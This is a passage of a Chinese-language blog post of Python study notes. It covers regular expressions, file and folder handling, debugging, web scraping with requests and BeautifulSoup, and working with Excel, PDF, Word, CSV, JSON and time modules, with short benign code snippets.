operator">>></span><span class="token operator">></span> mo<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token string">'123'</span><span class="token operator">>></span><span class="token operator">></span> mo<span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">,</span> <span class="token string">'456'</span><span class="token punctuation">,</span> <span class="token string">'7890'</span><span class="token punctuation">)</span></code></pre><p><strong>用管道符匹配多个分组</strong></p><p>用<code>|</code>可以匹配多个分组,<strong>第一次出现的匹配文本</strong>将作为Match对象返回.</p><p>如果需要匹配管道符,使用转义字符就行了.<code>\|</code></p><p><strong>用问号实现可选匹配</strong></p><p>字符<code>?</code>表明它前面的分组在这个模式中是可选的,即不论这段文本在不在,正则表达式都会认为匹配</p><p>也可以认为<code>?</code>表示匹配问号之前的分组0次或1次,如果需要匹配<code>?</code>则使用转义字符<code>\?</code></p><p><strong>用星号匹配零次或多次</strong></p><p><code>*</code>(称为星号),意味着匹配0次或多次,即星号之前的分组,可以在文本中出现任意次.</p><p><strong>用加号匹配一次或多次</strong></p><p><code>+</code>前面的分组必须至少出现一次.</p><p><strong>用花括号匹配特定次数</strong></p><p>如果想要一个分组重复特定次数，就在正则表达式中该分组的后面，跟上花括号包围的数字.比如(ha){3},就匹配”hahaha”</p><p>除了匹配指定次数,还可以匹配指定范围.{min,max}表示匹配前面字符串至少min次,最多max次.</p><p><strong>贪心和非贪心匹配</strong></p><p>Python 正则表达式默认是”贪心”的.即,在有多重情况下,尽可能匹配最长的字符串.花括号的“非贪心”版本匹配<strong>尽可能最短</strong>的字符串，即在<strong>结束的花括号后跟着一个问号</strong></p><blockquote><p>问号在正则表达式中可能有两种含义：声明非贪心匹配或表示可选的分组.这两种含义是完全无关的</p></blockquote><p><code>findall()方法</code></p><p>search()将<strong>返回一个Match对象</strong>，包含被查找字符串中的“第一次”匹配的文本，而 findall()方法将<strong>返回一组字符串</strong>，包含被查找字符串中的<strong>所有匹配.</strong></p><p>如果在正则表达式中有分组，那么 findall 将返回元组的列表,其中每个项就是正则表达式中每个分支的匹配字符串.</p><p>如果没有分组,就返回匹配字符串的列表</p><p><strong>字符分类</strong></p><table><thead><tr><th>\d</th><th>0 到 9的任何数字</th></tr></thead><tbody><tr><td>\D</td><td>除0 到 9 的数字以外的任何字符</td></tr><tr><td>\w</td><td>任何字母,数字或下划线字符(可以认为是匹配”单词”)</td></tr><tr><td>\W</td><td>除了字母,数字和下划线以外的任何字符</td></tr><tr><td>\s</td><td>空格,制表符或换行符</td></tr><tr><td>\S</td><td>除空格,制表符和换行符以外的任何字符</td></tr></tbody></table><p><strong>自定义字符分类</strong></p><p>用<code>[]</code> 自定义匹配,用<code>-</code>表示字母和数字的范围.如[a-zA-Z0-9]匹配所有大小写字母和数字</p><p>通过在字符分类的左方括号后加上一个插入字符（^），就可以得到“非字符类”。非字符类将匹配不在这个字符类中的所有字符</p><p><strong>插入字符和美元字符</strong></p><p>在正则表达式的开始处使用插入符号（<code>^</code>），表明匹配必须发生在被查找文本<strong>开始处</strong></p><p>可以再正则表达式的末尾加上美元符号（<code>$</code>），表示该字符串<strong>必须以这个正则表达式的模式结束</strong></p><p><strong>通配字符</strong></p><p>在正则表达式中,<code>.</code>字符称为”通配符”.,表示匹配除了换行之外的所有字符.<strong>句点字符只匹配一个字符</strong></p><pre><code>&gt;&gt;&gt; atRegex = re.compile(r&#39;.at&#39;)&gt;&gt;&gt; atRegex.findall(&#39;The cat in the hat sat on the flat mat.&#39;)[&#39;cat&#39;, &#39;hat&#39;, &#39;sat&#39;, &#39;lat&#39;, &#39;mat&#39;]# 因为.只匹配一个字符,所以flat只匹配了lat</code></pre><p><strong>用点-星匹配所有字符</strong></p><p><code>.*</code>表示”任意文本”</p><p>点-星使用“贪心”模式：它总是匹配尽可能多的文本。要用“非贪心”模式匹配所有文本，就使用点-星和问号,问号告诉 Python 用非贪心模式匹配<code>.*?</code></p><p><strong>用句点字符匹配换行</strong></p><p>点-星将匹配除换行外的所有字符。通过传入 <code>re.DOTALL</code> 作为 re.compile()的第二个参数，可以让句点字符匹配所有字符，包括换行字符</p><p><img src="https://i.loli.net/2020/02/07/s6MokGFZR9WtSOf.png" alt></p><p><strong>不区分大小写的匹配</strong></p><p>向 re.compile()传入 <code>re.IGNORECASE</code> 或 <code>re.I</code>，作为第二个参数.</p><p><strong>用<code>sub()</code>方法替换字符串</strong></p><p><code>sub()</code>方法需要传入两个参数,第一个参数是一个字符串,用于取代发现的匹配,第二个参数是一个字符串,即正则表达式.</p><p>向 re.compile()传入变量 <code>re.VERBOSE</code>，作为第二个参数,从而忽略字符串中的空白符和注释</p><p><strong>组合使用 re.IGNOREC ASE、re.DOTALL 和 re.VERBOSE</strong></p><p><code>re.compile()</code> 函数只接受一个值作为第二个参数,但是可以用<code>|</code>将变量组合起来,从而绕过这个限制,这个管道字符在这里称为”<strong>按位或</strong>“</p><h1 id="0x08-读写文件"><a href="#0x08-读写文件" class="headerlink" title="0x08    读写文件"></a>0x08    读写文件</h1><p>在 Windows 上，路径书写使用倒斜杠作为文件夹之间的分隔符</p><p>但在 OS X 和Linux 上，使用正斜杠作为它们的路径分隔符</p><p><code>os.path.join()</code> 函数用于创建文件名的字符串.</p><pre><code>&gt;&gt;&gt; os.path.join(&#39;usr&#39;,&#39;bin&#39;,&#39;spam&#39;)&#39;usr\\bin\\spam&#39; # 两个\是因为其中一个用用于转义</code></pre><p><code>os.getcwd()</code>函数可以取得当前工作路径的字符串,并且可以利用<code>os.chdir()</code>改变</p><p><strong>绝对路径和相对路径</strong></p><ul><li>“绝对路径”，总是从根文件夹开始</li><li>“相对路径”，它相对于程序的当前工作目录</li></ul><p><code>.</code>代表当前目录,<code>..</code>表示父目录</p><p><strong>用<code>os.makedirs()</code>创建新文件夹</strong></p><p><strong><code>os.path</code>模块</strong></p><p>os.path 模块包含了许多与文件名和文件路径相关的有用函数</p><p>因为os.path 是 os 模块中的模块,所以值要执行 import os 就可以导入了</p><p>调用<code>os.path.abspath(path)</code>将返回参数的绝对路径的字符串。这是将相对路径转换为绝对路径的简便方法</p><p>调用<code>os.path.isabs(path)</code>，如果参数是一个绝对路径，就返回 True，如果参数是一个相对路径，就返回 False</p><p>调用<code>os.path.relpath(path, start)</code>将返回从 start 路径到 path 的相对路径的字符串.<strong>如果没有提供 start，就使用当前工作目录作为开始路径</strong></p><p>调用<code>os.path.dirname(path)</code>将返回一个字符串，它包含 path 参数中最后一个斜杠之前的所有内容</p><p>调用<code>os.path.basename(path)</code>将返回一个字符串，它包含 path 参数中最后一个斜杠之后的所有内容</p><p>如果同时需要一个路径的目录名称和基本名称，就可以调用 <code>os.path.split()</code>，获得这两个字符串的元组</p><p><strong>查看文件大小和文件夹内容</strong></p><p>调用<code>os.path.getsize(path)</code>将返回 path 参数中文件的字节数</p><p>调用<code>os.listdir(path)</code>将返回文件名字符串的列表，包含 path 参数中的每个文件</p><p><strong>检查路径有效性</strong></p><p>如果你提供的路径不存在，许多 Python 函数就会崩溃并报错.<code>os.path</code> 模块提供了一些函数，用于检测给定的路径是否存在，以及它是文件还是文件夹</p><p>如果 path 参数所指的文件或文件夹存在，调用 <code>os.path.exists(path)</code>将返回 True，否则返回 False</p><p>如果 path 参数存在，并且是一个文件，调用 <code>os.path.isfile(path)</code>将返回 True，否则返回 False</p><p>如果 path 参数存在，并且是一个文件夹，调用 <code>os.path.isdir(path)</code>将返回 True，否则返回 False</p><p><strong>文件读写过程</strong></p><p>1．调用 open()函数，返回一个 File 对象</p><p>2．调用 File 对象的 read()或 write()方法</p><p>3．调用 File 对象的 close()方法，关闭该文件</p><p><strong>用<code>oepn()</code> 函数打开文件</strong></p><p>要用 open()函数打开一个文件，就要向它传递一个字符串路径，表明希望打开的文件。这既可以是绝对路径，也可以是相对路径</p><p>这些命令都将以读取纯文本文件的模式打开文件，或简称为“读模式”.可以向<code>open()</code>函数传入第二个参数<code>r</code>这和默认的open一样,只读</p><p><strong>读取文件内容</strong></p><p>有了File 对象,就可以读取内容了,用<code>read()</code>方法将整个文件的内容读取为字符串值.<code>readlines()</code>方法,从该文件取得一个字符串的列表.</p><p><strong>写入文件</strong></p><p>需要以“写入纯文本模式”或“添加纯文本模式”打开该文件，或简称为“写模式”和“添加模式”。</p><p>写模式将覆写原有的文件，从头开始，就像你用一个新值覆写一个变量的值。将<strong>‘w’作为第二个参数传递给 open()</strong>，以写模式打开该文件</p><blockquote><p><strong>添加模式将在已有文件的末尾添加文本</strong></p></blockquote><p><strong>将’a’ 作为第二个参数传递给open()</strong></p><p>如果传递给 open()的文件名不存在，写模式和添加模式都会创建一个新的空文件。<code>在读取或写入文件后，调用 close()方法，然后才能再次打开该文件</code></p><blockquote><p>write()方法不会像 print()函数那样，在字符串的末尾自动添加换行字符,必须自己添加该字符</p></blockquote><p><strong>用<code>shelve</code> 模块保存变量</strong></p><p>该模块可以将程序中的变量保存到二进制的shelf文件中.可以在程序中添加”保存”和”打开”功能.</p><p>shelf 值不必用读模式或写模式打开，因为它们在打开后，既能读又能写.</p><p>shelf 值有 keys() 和 value()方法,返回 shelf 中键和值的类似列表的值.因为这知识类似列表的值,所以可以使用<code>list()</code>方法,得到列表形式.</p><p><strong>用 pprint.pformat()函数保存变量</strong></p><h1 id="0x09-组织文件"><a href="#0x09-组织文件" class="headerlink" title="0x09    组织文件"></a>0x09    组织文件</h1><p><strong><code>shutil</code> 模块</strong></p><p>shutil(shell 工具)  模块中包含了一些函数,可以在python 程序中复制,移动,改名和删除文件.</p><p><code>shutil.copy(source,destination)</code> 将路径source 处的<strong>文件</strong>复制到路径 destination 处的文件夹. 如果 destination 是一个文件名,他将作为被复制文件的新名字.</p><p>函数会返回字符串,表示被复制文件的路径</p><p>shutil.copy()将复制一个文件，<code>shutil.copytree()</code>将复制整个文件夹，以及它包含的文件夹和文件。调用 <code>shutil.copytree(source, destination)</code>，将路径 source 处的<strong>文件夹</strong>，包括它的所有文件和子文件夹，复制到路径 destination 处的文件夹。source 和destination 参数都是字符串。该函数返回一个字符串，是新复制的文件夹的路径</p><p><strong>文件和文件夹的移动与改名</strong></p><p><code>shutil.move(source,destination)</code>, 将路径 source 出的文件夹移动到 destination,返回新位置的绝对路径的字符串</p><blockquote><p>如果destination 指向一个文件夹, source 文件将移动到 destination 中, 并保持原来的文件名.</p></blockquote><p> <strong>永久删除文件和文件夹</strong></p><p>利用<code>os&#39;</code>模块中的函数,可以删除一个文件或一个空文件夹.</p><p>利用<code>shutil</code>模块,可以删除一个文件夹及其所有的内容</p><p><code>os.unlink(path)</code> 将删除 path 处的文件</p><p><code>os.rmdir(path)</code>删除 path 处的 文件夹<strong>,该文件夹必须为空</strong></p><p><code>shutil.retree(path)</code>将删除 path 处的文件夹,它包含的所有文件和文件夹都会被删除</p><p>用<code>send2trash</code> 模块安全地删除</p><p>第三方的 send2trash 模块,会将文件夹和文件发送到计算机的垃圾箱,回收站,而不是永久删除.</p><p><strong>遍历目录树</strong></p><p><code>os.walk()</code> 函数被传入一个字符串值, 即一个文件夹的路径,在<code>for</code>循环中使用<code>os.walk()</code> 函数,遍历目录树</p><p><code>os.walk()</code> 在循环的每次迭代中,返回3 个值</p><ol><li>当前<strong>文件夹名称的</strong>字符串</li><li>当前文件夹中<strong>子文件夹的</strong>字符串的列表</li><li>当前文件夹中<strong>文件的</strong>字符串的列表</li></ol><p><strong>用 <code>zipfile</code> 模块压缩文件</strong></p><p>将多个文件打包成一个文件,这个文件叫做”归档文件”. </p><p>创建一个<code>ZipFile</code>对象就需要调用<code>zipfile.ZipFle()</code>函数.</p><blockquote><p>ZipFile 对象有一个 namelist()方法，返回 ZIP 文件中包含的所有文件和文件夹的字符串的列表。这些字符串可以传递给 ZipFile 对象的 getinfo()方法，返回一个关于特定文件的 ZipInfo 对象。ZipInfo 对象有自己的属性，诸如表示字节数的 file_size和 compress_size，它们分别表示原来文件大小和压缩后文件大小。ZipFile 对象表示整个归档文件，而 ZipInfo 对象则保存该归档文件中每个文件的有用信息</p></blockquote><p>ZipFile对象的<code>extractall()</code>方法从ZIP文件中解压缩所有的文件和文件,放到当前工作目录中</p><p><strong>创建和添加到ZIP文件</strong></p><p>以”写模式” 打开 ZipFile 对象,即传入’w’作为第二个参数</p><h1 id="0x10-调试"><a href="#0x10-调试" class="headerlink" title="0x10    调试"></a>0x10    调试</h1><p><strong>抛出异常</strong></p><p>前面学习了用 try 和except 来处理异常.</p><p>抛出异常使用 raise 语句</p><ul><li>raise 关键字</li><li>对 Exception 函数的调用</li><li>传递给 Exception 函数的字符串,包含有用的错误信息</li></ul><p><strong>取得反向跟踪的字符串</strong></p><blockquote><p>如果 Python 遇到错误，它就会生成一些错误信息，称为“反向跟踪”。反向跟踪包含了出错消息、导致该错误的代码行号，以及导致该错误的函数调用的序列。这个序列称为“调用栈”</p></blockquote><p>从下往上(反向)追踪</p><p><strong>断言</strong></p><p>“断言”是一个心智正常的检查，<strong>确保代码没有做什么明显错误的事情</strong>.这些心智正常的检查由 assert 语句执行.如果检查失败，就会抛出异常.在代码中，assert</p><p>语句包含以下部分：</p><p>• assert 关键字；</p><p>• 条件（即求值为 True 或 False 的表达式）；</p><p>• 逗号；</p><p>• <strong>当条件为 False 时显示的字符串</strong></p><blockquote><p>在运行py时,传入<code>-O</code>选项,可以禁用断言.</p></blockquote><p><strong>日志</strong></p><p>日志模块 <code>logging</code> 在程序运行时,将日志信息显示在屏幕上</p><p><strong>禁用日志</strong></p><p>函数 <code>logging.disable()</code></p><p><strong>断点</strong></p><p>“断点”可以设置在特定的代码行上，当程序执行到达该行时，它迫使调试器暂停</p><h1 id="0x11-从-Web-抓取信息-是重点"><a href="#0x11-从-Web-抓取信息-是重点" class="headerlink" title="0x11    从 Web 抓取信息(是重点!)"></a>0x11    从 Web 抓取信息(是重点!)</h1><p>主要是三个模块</p><p>webbrowser requests BeautifulSoup selenium</p><p>我之前也学习过这部分的内容</p><p><a href="http://hack-for.fun/2019/12/04/Python%20re%20,%20request%20%E5%BA%93%E4%BD%BF%E7%94%A8/">Python request 和 re </a></p><p>用标准的open()和wirte()方法,可以将Web 页面保存到文件中,保存在当前工作目录</p><p>必须使用”写二进制”模式打开该文件,即向函数传入字符串’wb’,作为open()的第二产生.</p><p><strong>用BeatutifulSoup 模块解析 HTML</strong></p><p>导入模块<code>from bs4 import BeautifulSoup</code></p><p>获取BeautifulSoup 对象 <code>exampleSoup = bs4.BeautifulSoup(exampleFile)</code></p><p>有了对象后, 就可以利用方法来定位HTML文档中的特定部分</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> requests<span class="token punctuation">,</span> bs4<span class="token comment" spellcheck="true"># 利用requests.get()函数从博客下载主页</span><span class="token operator">>></span><span class="token operator">></span> res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://hack-for.fun'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> res<span class="token punctuation">.</span>raise_for_status<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建一个BeautifulSoup对象</span><span class="token operator">>></span><span class="token operator">></span> noStarchSoup <span class="token operator">=</span> bs4<span class="token punctuation">.</span>BeautifulSoup<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> type<span class="token punctuation">(</span>noStarchSoup<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bs4.BeautifulSoup'</span><span class="token operator">></span></code></pre><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> exampleFile <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'example.html'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 向bs4.BeautifulSoup() 传递一个File对象,从硬盘中加载HTML文件</span><span class="token operator">>></span><span class="token operator">></span> exampleSoup <span class="token operator">=</span> bs4<span class="token punctuation">.</span>BeautifulSoup<span class="token punctuation">(</span>exampleFile<span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> type<span class="token punctuation">(</span>exampleSoup<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bs4.BeautifulSoup'</span><span class="token operator">></span></code></pre><p>用<code>select()</code>方法寻找元素</p><pre><code>soup.select(&#39;div&#39;) 所有名为&lt;div&gt;的元素soup.select(&#39;#author&#39;) 带有 id 属性为 author 的元素soup.select(&#39;.notice&#39;) 所有使用 CSS class 属性名为 notice 的元素soup.select(&#39;div span&#39;) 所有在&lt;div&gt;元素之内的&lt;span&gt;元素soup.select(&#39;div &gt; span&#39;) 所有直接在&lt;div&gt;元素之内的&lt;span&gt;元素，中间没有其他元素soup.select(&#39;input[name]&#39;) 所有名为&lt;input&gt;，并有一个 name 属性，其值无所谓的元素soup.select(&#39;input[type=&quot;button&quot;]&#39;) 所有名为&lt;input&gt;，并有一个 type 属性，其值为 button 的元素</code></pre><p>select()方法将返回一个Tag对象的列表,这是BeautifulSoup表示一个HTML元素的方式</p><p>Tag 值可以传递给str()函数,显示他们的HTML标签.Tag 值也可以有<code>attrs</code>属性,它将Tag 的所有HTML属性作为一个字典</p><p>在每个元素上使用<code>getText()</code> 可以显示文本</p><p>Tag 对象的 get()方法让我们很容易从元素中获取属性值。<strong>向该方法传入一个属性名称的字符串，它将返回该属性的值</strong></p><p>查看<code>&lt;a&gt;</code> 这个元素向上看,<code>&lt;h3 class=&quot;r&quot;&gt;</code> 说明,<code>r类</code>仅用于查询结果链接</p><p>用<code>selenium</code> 模块控制浏览器</p><p>详细内容跳过</p><h1 id="0x12-处理Excel电子表格"><a href="#0x12-处理Excel电子表格" class="headerlink" title="0x12    处理Excel电子表格"></a>0x12    处理Excel电子表格</h1><p>使用<code>openpyxl</code> 模块可以让 Python程序能读取和修改Excel 电子表格文件</p><p><strong>Excel 文档的定义</strong></p><p>一个 Excel 电子表格文档称为一个工作簿。一个工作簿保存在扩展名为.xlsx 的文件中。每个工作簿可以包含多个表（也称为工作表）用户当前查看的表( 或关闭Excel 前最后查看的表 ) , 称为活动表.</p><p>每个表都有一些列（地址是从 A 开始的字母）和一些行（地址是从 1 开始的数字）。在特定行和列的方格称为单元格。每个单元格都包含一个数字或文本值。单元格形成的网格和数据构成了表</p><p><strong>用 openpyxl 模块打开 Excel 文档</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> openpyxlwb <span class="token operator">=</span> openpyxl<span class="token punctuation">.</span>load_workbook<span class="token punctuation">(</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span></code></pre><p>函数接受文件名, 返回一个 workbook 数据类型的值</p><p>调用 <code>get_sheet_names()</code>方法可以取得工作簿中所有表名的列表,每个表由一个 Worksheet 对象表示</p><p>可以通过向工作簿方法 <code>get_sheet_by_name()</code>传递表名字符串获得.最后，可以调用 Workbook 对象的 <code>get_active_sheet()</code>方法，取得工作簿的活动表</p><p><strong>从表中取得单元格</strong></p><p>有了 Worksheet 对象后，就可以按名字访问 Cell 对象.</p><p>Cell 对象有一个 value 属性，不出意外，它包含这个单元格中保存的值。Cell 对象也有 row、column 和 coordinate 属性，提供该单元格的位置信息</p><p>可以通过 Worksheet 对象的 <code>get_highest_row()</code>和 <code>get_highest_column()</code>方法(返回一个整数,而不是出现的字母)，确定表的大小</p><p><strong>列字母和数字之间的转换</strong></p><p>要从字母转换到数字，就调用 <code>openpyxl.cell.column_index_from_string()</code>函数</p><p>要从数字转换到字母，就调用 <code>openpyxl.cell.get_column_letter()</code>函数</p><p><strong>从表中取得行和列</strong></p><p>可以将 Worksheet 对象切片，取得电子表格中一行、一列或一个矩形区域中的所有Cell 对象.然后可以循环遍历这个切片中的所有单元格</p><p>流程</p><p>1．导入 openpyxl 模块。</p><p>2．调用 openpyxl.load_workbook()函数。</p><p>3．取得 Workbook 对象。</p><p>4．调用 get_active_sheet()或 get_sheet_by_name()工作簿方法。</p><p>5．取得 Worksheet 对象。</p><p>6．使用索引或工作表的 cell()方法，带上 row 和 column 关键字参数。</p><p>7．取得 Cell 对象。</p><p>8．读取 Cell 对象的 value 属性。</p><p>调用 <code>openpyxl.Workbook()</code>函数，创建一个新的空 Workbook 对象</p><p>利用<code>create_sheet() and remove_sheet()</code>方法，可以在工作簿中添加或删除工作表</p><p><code>create_sheet()</code>方法返回一个新的 Worksheet 对象，名为 SheetX，它默认是工作簿的最后一个工作表。或者，可以利用 index 和 title 关键字参数，指定新工作表的索引或名称</p><p>为了定义单元格的字体风格，需要从 <code>openpyxl.styles</code>模块导入<code>Font()和 Style()</code>函数</p><p><code>from openpyxl.styles import Font, Style</code></p><p><strong>Font 对象</strong></p><p>Font 对象的 style 属性影响文本在单元格中的显示方式。要设置字体风格属性，就向 Font()函数传入关键字参数</p><p>后面的内容跳过了</p><h1 id="0x13-处理-PDF-和-Word-文档"><a href="#0x13-处理-PDF-和-Word-文档" class="headerlink" title="0x13    处理 PDF 和 Word 文档"></a>0x13    处理 PDF 和 Word 文档</h1><p>PDF 和 Word 文档是<strong>二进制文件</strong>，所以它们比纯文本文件要复杂得多</p><p>PDF 表示 Portable Document Format，使用<code>.pdf</code> 文件扩展名</p><p>模块<code>PyPDF2</code> 用于处理PDF</p><p>PyPDF2 没有办法从 PDF 文档中提取图像、图表或其他媒体，但它可以提取文本，并将文本返回为 Python 字符串</p><p>*<em>解密 PDF *</em></p><p> 所有 PdfFileReader 对象都有一个 isEncrypted 属性，如果 PDF 是加密的，它就是 True，如果不是，它就是 False</p><p>调用<code>decrypt()</code> 函数, 传入口令字符串,就可以读取加密的PDF(可以爆破了)</p><p><strong>加密 PDF</strong></p><p><code>PdfFileWriter</code> 对象也可以为PDF文档进行加密.</p><p>在调用 write()方法保存文件之前，调用 encrypt()方法，传入口令字符串</p><p><strong>创建PDF</strong></p><p>在 PyPDF2 中，与 PdfFileReader 对象相对的是 PdfFileWriter 对象，它可以创建一个新的 PDF 文件</p><p>PyPDF2 写入 PDF 的能力，仅限于从其他 PDF 中拷贝页面、旋转页面、重叠页面和加密文件</p><p>1．打开一个或多个已有的 PDF（源 PDF），得到 PdfFileReader 对象</p><p>2．创建一个新的 PdfFileWriter 对象</p><p>3．将页面从 PdfFileReader 对象拷贝到 PdfFileWriter 对象中</p><p>4．最后，利用 PdfFileWriter 对象写入输出的 PDF</p><p><strong>叠加页面</strong></p><p>生成<code>PdfFileReader</code> 对象,调用<code>getPage(0)</code> 取得第一页的 Page 对象.</p><hr><p><strong>Word 文档</strong></p><p><code>docx</code>模块 可以创建和修改 Word 文档,<code>.docx</code>文件的扩展名</p><p>打开<code>.docx</code> 文件, 调用 <code>docx.Document()</code>,参数为文件名,返回 Document 对象,有 paragraphs 属性,是Paragraph 对象的列表.</p><p><strong>从.docx 文件中取得完整的文本</strong></p><p>调用<code>getText()</code>函数,接受的参数为 <code>.docx</code> 文件名,返回其中文本的字符串</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> docx<span class="token keyword">def</span> <span class="token function">getText</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>doc <span class="token operator">=</span> docx<span class="token punctuation">.</span>Document<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>fullText <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> para <span class="token keyword">in</span> doc<span class="token punctuation">.</span>paragraphs<span class="token punctuation">:</span>fullText<span class="token punctuation">.</span>append<span class="token punctuation">(</span>para<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>fullText<span class="token punctuation">)</span></code></pre><p><code>getText()</code>函数打开 Word文档,循环遍历 paragraphs 列表中的所有 Paragraph对象，然后将它们的文本添加到 fullText 列表中。循环结束后，fullText 中的字符串连接在一起，中间以换行符分隔</p><p><strong>Run 属性</strong></p><table><thead><tr><th align="center">bold</th><th align="center">文本以粗体出现</th></tr></thead><tbody><tr><td align="center">italic</td><td align="center">文本以斜体出现</td></tr><tr><td align="center">underline</td><td align="center">文本带下划线</td></tr><tr><td align="center">strike</td><td align="center">文本带删除线</td></tr><tr><td align="center">double_strike</td><td align="center">文本带双删除线</td></tr><tr><td align="center">all_caps</td><td align="center">文本以大写首字母出现</td></tr></tbody></table><p>等.</p><p>更多的,我觉得还是遇见了再说吧~</p><h1 id="0x14-处理CSV文件和JSON数据"><a href="#0x14-处理CSV文件和JSON数据" class="headerlink" title="0x14    处理CSV文件和JSON数据"></a>0x14    处理CSV文件和JSON数据</h1><p>CSV 和 JSON 文件是纯文本文件.CVS 表示”Comma-Separated Values(逗号分隔的值)”.CVS文件是简化的电子表格,保存为纯文本文件.</p><p>JSON,以 JavaScript 源代码的形式,将信息保存在纯文本文件中.</p><p><strong>csv 模块</strong></p><p>CSV 文件中的每行代表电子表格中的一行, 逗号分隔了该行中的单元格.</p><p>CSV文件中: </p><p>• 值没有类型，所有东西都是字符串</p><p>• 没有字体大小或颜色的设置</p><p>• 没有多个工作表</p><p>• 不能指定单元格的宽度和高度</p><p>• 不能合并单元格</p><p>• 不能嵌入图像或图表</p><p>CSV 格式和它声称的完全一致：<strong>它就是一个文本文件，具有逗号分隔的值</strong></p><p>要用 csv 模块从 CSV 文件中读取数据，需要创建一个 Reader 对象</p><p><strong>Reader 对象让你迭代遍历 CSV 文件中的每一行</strong></p><p>csv 模块是Python 自带的,不需要安装</p><p>首先用<code>open()</code> 函数打开 要读取的 csv 文件.然后将值传递给<code>csv.reader()</code> 函数.这将返回一个 Reader 对象</p><p>要访问 Reader 对象中的值, 最直接的方法是将它转换成一个普通的 Python 列表, 即传递给 list()</p><p><strong>在 for 循环中，从 Reader 对象读取数据</strong></p><p>循环遍历 Reader 对象中的行,每一行是一个值的列表,每个值表示一个单元格</p><p><strong>Writer 对象</strong></p><p>可以写入数据进入 CSV 文件. 创建 Writer 对象, 使用<code>csv.writer()</code> 函数</p><p>在 Windows 上，需要为 open()函数的 newline 关键字参数传入一个空字符串</p><p>Writer 对象的 writerow()方法接受一个列表参数。列表中的每个词，放在输出的</p><p>CSV 文件中的一个单元格中。writerow()函数的返回值，是写入文件中这一行的字符数（包括换行字符</p><p><strong>delimiter 和 lineterminator 关键字参数</strong> </p><p>利用 csv.writer()的 delimiter 和 lineterminator关键字参数，将终止符改成不同的值</p><hr><p><strong>JSON 和 API</strong> </p><p>很多网站都提供 JSON 格式的内容，作为程序与网站交互的方式。这就是所谓的提供“应用程序编程接口（API）,访问 API 和 通过URL访问任何其他网页是一样的.</p><p>API 返回的数据是针对机器格式化的（例如用 JSON），API 不是人容易阅读的</p><p>python 的 json 模块处理了 JSON 数据字符串和 Python 值之间转换的所有细节，得到了 <code>json.loads()</code>和 <code>json.dumps()</code>函数</p><p>JSON 只能包含的数据类型: 字符串、整型、浮点型、布尔型、列表、字典和 NoneType</p><p>不能表示的数据类型: File 对象、CSV Reader 或 Writer 对象、Regex对象或 Selenium WebElement 对象</p><p><strong><code>loads()</code> 函数读取 JSON</strong></p><p><code>json.loads()</code>函数, 将 JSON数据转换为 Python 值(load string)</p><blockquote><p>JSON 字符串总是用双引号</p></blockquote><p>函数返回Python 字典.</p><p><strong>用 <code>dumps()</code> 函数写出 JSON</strong></p><p>该值只能是以下基本 Python 数据类型之一：字典、列表、整型、浮点型、字符串、布尔型或 None</p><p><code>%s</code> 表示占位符,</p><h1 id="0x15-保持时间-计划任务和启动程序"><a href="#0x15-保持时间-计划任务和启动程序" class="headerlink" title="0x15    保持时间,计划任务和启动程序"></a>0x15    保持时间,计划任务和启动程序</h1><p><code>time</code> 和 <code>datetime</code> 提供了时间相关的函数,<code>subprocess</code> 和 <code>threading</code> 模块 可以按时启动</p><p><strong>time 模块</strong></p><p><code>time.time()</code> 函数返回自那一刻以来的秒数,是一个浮点数.这个数字称为 UNIX 纪元时间戳,</p><p>Unix 纪元是编程中常参考的时间, 1970 年 1 月 1 日 0点,即<strong>协调世界时 (UTC)</strong></p><p><code>time.sleep()</code>函数</p><p>让程序暂停,就需要调用这个函数,传入希望程序暂停的秒数2</p><p>数字四舍五入</p><p><code>round()</code> 函数 将一些长的数字缩短.,按照指定的精度四舍五入到一个浮点数,如果省略第二个参数,round()函数将数字四舍五入到最接近的整数</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> timenowtime <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>nowtime<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>round<span class="token punctuation">(</span>nowtime<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>打印的结果<span class="token punctuation">:</span> <span class="token number">1581219302.716289</span><span class="token number">1581219302.72</span><span class="token number">1581219303</span></code></pre><p><strong><code>datetime</code> 模块</strong></p><p>time 模块用于取得 Unix 纪元时间戳,为了方便可读的需要使用<code>datetime</code> 模块</p><p>调用<code>datetime.datetime.now()</code>返回一个datetime 对象,表示当前的时期和时间</p><p>Unix 纪元时间戳 可以通过<code>datetime.datetime.fromtimestamp()</code> 转换为datetime 对象</p><p><strong><code>timedelta</code> 数据类型</strong></p><p>datetime 模块还提供了 timedelta 数据类型，<strong>它表示一段时间，而不是一个时刻</strong></p><p>创建 timedelta 对象, 就用 <code>datetime.timedelta()</code> 函数,</p><p>接受关键字参数 